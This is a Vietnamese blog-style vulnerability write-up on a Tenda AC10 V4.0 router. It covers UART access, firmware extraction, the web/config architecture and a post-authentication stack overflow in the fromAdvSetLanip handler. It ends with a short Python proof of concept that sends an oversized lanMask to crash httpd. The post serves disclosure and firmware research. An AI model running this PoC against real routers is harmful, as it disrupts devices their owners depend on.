# Firmware Analysis: Stack-Based Buffer Overflow trên Tenda Router
*[13/6/2026] • Thời gian đọc: ~18 phút*

---

## Mở đầu

Series tìm hiểu firmware security lần này chúng rẽ sang một dòng thiết bị mà chắc ai ở Việt Nam cũng từng thấy qua: router Tenda.

Lý do chọn thì chẳng có gì cao siêu. Tenda phổ biến, nhà nào lắp gói mạng giá rẻ gần như cũng có một con. Lịch sử CVE của hãng thì khỏi bàn, search sơ sơ đã ra một danh sách khá dài.

![image_cve_count](/pictures/WriteUp/Tenda/AC10/image_cve_count.png)

Thế là lại có dịp ra chợ đồ cũ gần trường và nhặt về ba con, mỗi con 1 hãng mặc cả mãi bà chị mới mới đồng giá 90k/con, tôi không giỏi mặc cả lắm. Về nhà cắm vào thì lạy chúa nó boot lên được, nhưng cái màn hình đăng nhập hiện ra thì toàn chữ Trung. Một trong ba con hóa ra là Tenda AC10 V4.0 chạy firmware nội địa Trung, khả năng cao là hàng song song hoặc bị đem về rồi bán lại, còn mấy con kia chắc sắp tới lại có writeup tiếp.

---

## Mở Vỏ và Kết Nối UART

Thay vì tải firmware về rồi binwalk như bài các lần trước, lần này có đồ thật mình muốn thử tiếp cận theo hướng khác hơn một chút — cụ thể là kết nối UART để đọc boot log trực tiếp từ thiết bị. UART là một giao thức serial cực kỳ phổ biến trên embedded device, và hầu hết các router đều có debug port này để nhà sản xuất dùng trong quá trình phát triển. Mọi người sẽ cần 1 cái usb to ttl để đọc uart, link: https://shopee.vn/USB-TO-TTL-Chip-CP2102-UART-i.23934243.3506694423

![image_pcb](/pictures/WriteUp/Tenda/AC10/image_pcb.png)

Bên trong PCB khá thoáng, và thứ mình quan tâm nhất là cụm 4 chân pinout nằm gần cạnh board — đây gần như luôn là UART header. Bốn chân này thường là VCC, GND, TX, RX, cám ơn nhà sản xuất đã in sẵn nên đỡ phải dò từng chân là gì, mỗi tội in bị lệch :-)), phần đấu nối thì chỉ cần ba dây: 
USB-TTL   <->   Router
GND       <->     GND
RX        <->     TX
TX        <->     RX

![image_pcb](/pictures/WriteUp/Tenda/AC10/image_uart_connect.png)

Cắm vào máy trên Linux nó hiện ra dưới dạng `/dev/ttyUSB0` . Và test những **baud rate** phổ biến, baud sai thì log ra sẽ toàn ký tự rác kiểu `����`, cứ thử lần lượt 115200, 57600, 9600 đến khi log đổ ra chữ đọc được, trong trường hợp của mình là 115200. Đọc qua thì có vài thông tin thú vị thôi:

```
Board: MIPS sfa18 A28 MPW0 ac28
DRAM:  64 MiB
SF: Detected BY25Q64AS ... total 8 MiB
[    0.000000] Linux version 4.14.90 ... (OpenWrt GCC 7.4.0)
[    0.000000] MIPS: machine is sf19a28-ac28s
```

Vậy là biết được con này chạy **SoC Siflower SF19A28** (MIPS, 4 nhân), **64MB RAM**, **8MB SPI NOR**, kernel **Linux 4.14.90** dựng trên nền OpenWrt/SDK Siflower. Bootlog còn khai luôn bảng phân vùng flash, tiện cho việc dump sau này:

```
Creating 8 MTD partitions on "spi2.0":
0x000000000000-0x000000008000 : "spl-loader"
0x000000008000-0x00000006f000 : "u-boot"
0x00000006f000-0x000000070000 : "u-boot-env"
0x000000070000-0x000000080000 : "factory"
0x000000080000-0x0000007d0000 : "firmware"    (kernel + rootfs squashfs)
```

Thôi đây mình đi hướng gọn hơn: **tải thẳng firmware từ trang public rồi bung ra đọc.**

## Lấy firmware từ nguồn public

Không phải lúc nào cũng cần đục UART hay xì flash ra để có được rootfs — với mấy hãng consumer như Tenda thì firmware nằm sẵn trên trang download chính thức. Vào trang support của Tenda, tìm đúng model (AC10) rồi tải file firmware về: https://www.tendacn.com/material/show/104560

## Test cái tool mới 

Có file `.bin` rồi thì thay vì `binwalk` xong ngồi `grep` tay từng thứ, mình quăng thẳng vào cái firmware toolkit tự viết. Ý tưởng của nó gọn thôi, làm hai việc:

1. **Extract + lùng file nhạy cảm** — bung rootfs ra rồi tự động rà mấy thứ hay chứa đồ ăn liền: private key, cert, file config có credential, `shadow`, script có mật khẩu hardcode...
2. **Chấm điểm từng binary** — với mỗi ELF, nó parse symbol/import rồi cộng điểm theo những **hàm "nguy hiểm"** mà binary đó gọi. Càng nhiều hàm dễ dính lỗi (`system`, `popen`, `exec*`, `strcpy`, `sprintf`, `strcat`, `memcpy`, `gets`...) thì điểm càng cao — tức là ứng viên đáng soi trước.

Ý tưởng đằng sau việc chấm điểm: thay vì mở lần lượt vài chục binary, cứ nhắm mấy thằng "bề mặt tấn công dày" nhất mà đục — thường là web server và đám xử lý input từ ngoài vào. Mọi người có thể clone về ở [đây](https://github.com/teiwiet/firmlyzer) sắp tới chắc là làm thêm fuzzer vào.

Chạy nó lên thư mục firmware:

```bash
# cargo build trước nhé
./firmlyzer analyze US_AC10V4.0_V16.03.10.09_multi_TDE01.bin
```

![image_sensitive_file](/pictures/WriteUp/Tenda/AC10/image_sensitive_file.png)

![image_dangerous_file](/pictures/WriteUp/Tenda/AC10/image_dangerous_file.png)

Như dự đoán, mặc dù hơi bị lặp vì binwalk ra 2 folder squashfs-root nhưng mà vẫn là mấy binary leo top bảng điểm toàn là đám ăn input từ ngoài — điển hình là web server và tiến trình xử lý cấu hình của Tenda. Đây chính là chỗ mình đào tiếp ở phần sau.

## Kiến trúc xử lý web của Tenda
 
Trước khi săn bug, mình muốn hiểu **một request đi từ dây mạng vào tới đâu** đã — chứ cứ cắm đầu grep `strcpy` thì thấy cây mà không thấy rừng. Kéo con web server vào Ghidra (nhớ chọn **MIPS little-endian** như bootlog báo), để auto-analyze xong thì lần theo bốn tầng sau.
 
**1. Lõi goahead — phần ít quan tâm.** Bootlog cho biết web chạy trên **GoAhead 3.3.0**, tức là phần socket, accept, parse HTTP, phục vụ file tĩnh trong webroot đều là code open-source của goahead. Chỗ này hiếm bug và không phải thứ mình đào. Cái đáng soi là **lớp Tenda gắn lên trên** goahead.
 
**2. Bảng định tuyến — "mục lục" của attack surface.** Request động của Tenda đi qua dạng `/goform/<Ten>`. Trong binary, mỗi endpoint được đăng ký bằng một lời gọi kiểu `websFormDefine("<Ten>", handler)`, hoặc gom thành một **bảng global** gồm các cặp `{ tên_form, con_trỏ_hàm }`. Tìm được chỗ đăng ký hàng loạt đó là ra **nguyên danh sách endpoint kèm hàm xử lý tương ứng** — khỏi phải mò từng cái. Đây chính là bản đồ toàn bộ bề mặt tấn công.
 
**3. Bên trong một handler — cái pattern lặp đi lặp lại.** Mở vài handler ra sẽ thấy chúng gần như cùng một khuôn:
 
- Lấy tham số người dùng: `websGetVar(wp, "<key>", "")` (hoặc wrapper riêng của Tenda) → trả về chuỗi **do attacker kiểm soát**.
- Validate — hoặc… không. Chỗ thiếu kiểm tra độ dài / định dạng là nơi cần khoanh.
- Đọc hoặc ghi cấu hình qua lớp config (mục 4).
- Ghép response trả về.
Nắm được khuôn này thì đọc handler nào cũng nhanh: chỉ cần nhìn "key nào vào, đi đâu, có bị đụng chạm gì không".
 
**4. Lớp config — bộ não thật sự.** Đây là chỗ hay nhất trong kiến trúc Tenda. httpd **không** đụng thẳng vào flash; nó gọi getter/setter kiểu `GetValue(key, buf)` / `SetValue(key, val)` để nói chuyện với **cfm** (config manager). Dữ liệu đó nằm trong partition **CFM / CFM_BACKUP** — đúng mấy phân vùng thấy trong bootlog, kèm dòng `mib_nvram_cfm_commit` lúc ghi. Hiểu tầng này quan trọng vì hai lẽ:
 
- Nó cho biết **key nào ánh xạ ra thiết lập nào**, để lần dữ liệu qua lại.
- Và quan trọng hơn: giá trị attacker set qua web thường **không** bị dùng ngay trong httpd, mà được **một tiến trình khác** (daemon cấu hình / netctrl) đọc lại rồi nhét vào lệnh shell.
**5. Cross-process data-flow — chỗ chôn bug ngon nhất.** Vì kiến trúc tách rời như trên, lỗ hổng không nhất thiết nằm trong httpd. Đường đi đáng bám là:
 
```
web nhận input  →  SetValue("key", <chuỗi bẩn>)  →  ghi vào CFM
                                                        │
daemon cấu hình  →  GetValue("key")  →  sprintf/system(...)  
```
 
Tức là **web ghi config, một binary khác đọc config đó ra rồi build câu lệnh** — bug kiểu *second-order*: input bẩn nằm im trong nvram một lúc rồi mới phát tác ở tiến trình khác. Đây là lý do lúc nãy `firmlyzer` cũng chấm điểm cao cho **tiến trình xử lý cấu hình** chứ không riêng web server — hai thằng phải đọc cùng nhau mới thấy được cả chuỗi.
 
Còn một tầng nữa cần khoanh song song: **auth**. Xem chỗ nào check cookie/session — nằm ở đầu từng handler hay ở một điểm chung? Endpoint nào **bỏ qua** bước check chính là bề mặt **pre-auth**, ưu tiên số một.
 
Có bản đồ bốn tầng này rồi thì phần sau mình chọn đúng một endpoint, đi trọn chuỗi từ `/goform/...` cho tới chỗ nó phát nổ.
 
## `fromAdvSetLanip` — Stack-Based Buffer Overflow
 
### Chọn mục tiêu
 
Bám theo bảng định tuyến, `fromAdvSetLanip` là handler đứng sau endpoint `/goform/AdvSetLanip` — chuyên xử lý cấu hình LAN/DHCP. Nhìn sơ nó không sexy như mấy thứ upload hay VPN, nhưng ngay khi mở ra trong Ghidra thì thấy đây đúng kiểu bug mà kiến trúc *SetValue/GetValue* tạo điều kiện: handler này **vừa ghi vừa đọc lại** cùng một nhóm key config — tức là bề mặt tấn công nằm ngay trong một hàm.
 
### Phía write — `SetValue` không giới hạn theo consumer
 
Khi gọi `SetValue`, config manager phía trong `cfmd` dùng buffer 1500 byte và `strncpy` với bound cố định `0x5dc`:
 
```c
char local_5f4[1500];
...
strncpy(local_5f4, param_2, 0x5dc);  // up to 1499 bytes ghi thẳng vào NVRAM
```
 
Không có gì sai ở đây nếu đứng độc lập — 1499 byte là giới hạn của *lớp lưu trữ*. Vấn đề là lớp lưu trữ **không biết** consumer phía trên sẽ đọc lại vào buffer bao nhiêu byte.
 
### Phía read — `GetValue` dùng sai bound
 
Đây là chỗ logic vỡ. Khi GET, cfmd copy ngược ra theo `strlen(source)` — tức bound = **độ dài chuỗi đang lưu**, chứ không phải kích thước buffer đích:
 
```c
sVar1 = strlen(local_5f4);           // bao nhiêu byte đang lưu trong cfmd
strncpy(param_2, local_5f4, sVar1);  // bound = source len, không phải dest size
sVar1 = strnlen(local_5f4, 0x5dc);
param_2[sVar1] = '\0';
```
 
`strncpy(dst, src, strlen(src))` tương đương `strcpy` — không bảo vệ gì. Buffer đích bao lớn hoàn toàn không được xét tới.
 
### Hai bên va nhau
 
Quay lại `fromAdvSetLanip`, các buffer đích mà nó truyền vào `GetValue` rất nhỏ:
 
```c
char acStack_80[8];     // dhcps.en
char acStack_1a0[16];   // lan.ip
char acStack_190[16];   // lan.mask
 
GetValue("dhcps.en", acStack_80);   // 8-byte buffer ← tràn nếu lưu > 7 byte
GetValue("lan.ip",   acStack_1a0);  // 16-byte buffer ← tràn nếu lưu > 15 byte
GetValue("lan.mask", acStack_190);  // 16-byte buffer ← tràn nếu lưu > 15 byte
```
 
Kịch bản tấn công là hai bước:
 
1. **Ghi payload vào NVRAM** qua một request POST với `lanMask` là chuỗi dài — `SetValue` chấp nhận thoải mái vì chưa vượt 1499 byte.
2. **Kích trigger đọc lại** bằng một request thứ hai — `GetValue("lan.mask", acStack_190)` copy payload 1000 byte vào buffer 16 byte trên stack, ghi đè saved frame pointer và saved return address.
### PoC
 
```python
import requests
 
url  = "http://192.168.0.1/goform/AdvSetLanip"
# phải có session hợp lệ
cookies = {"LoginUID": "<session>"}
 
# Bước 1 — bơm payload vào NVRAM
requests.post(url, data={"lanMask": "A" * 1000}, cookies=cookies)
 
# Bước 2 — trigger đọc lại → crash
requests.post(url, data={"lanIp": "192.168.0.1"}, cookies=cookies)
```
 
![image_crash](/pictures/WriteUp/Tenda/AC10/image_crash.png)
 
`httpd` crash ngay sau request thứ hai — stack bị ghi đè, saved return address không còn hợp lệ.
 
### Tác động và giới hạn
 
Điều kiện khai thác cần **session admin hợp lệ**, tức là post-auth — không phải zero-click. Tuy nhiên trên thiết bị consumer kiểu này mật khẩu admin mặc định thường yếu hoặc bị reuse, nên "post-auth" thực tế không phải rào cản lớn.
 
Ở mức xác nhận hiện tại: **DoS chắc chắn** (httpd crash, router mất web UI cho đến khi watchdog khởi động lại tiến trình). Ghi đè saved return address về lý thuyết dẫn đến arbitrary code execution, nhưng cần bypass các mitigation trên MIPS (nếu có) — chưa đi tới đó. Mình cũng thử xin CVE ở vuldb tính đến nay cũng là gần 2 tuần rồi mà vẫn ở trạng thái analysis, hóng quá :-)).

## Advisory & References
 
| | |
|---|---|
| **Advisory** | [https://github.com/teiwiet/tenda-ac10-vulnerabilities/blob/main/advisory-fromAdvSetLanip.md] |
| **Vendor** | Tenda |
| **Firmware** | [US_AC10V4.0si_V16.03.10.09_multi_TDE01](https://www.tendacn.com/material/show/104560) |
| **Tool** | [firmlyzer](https://github.com/teiwiet/firmlyzer) · Ghidra · binwalk |
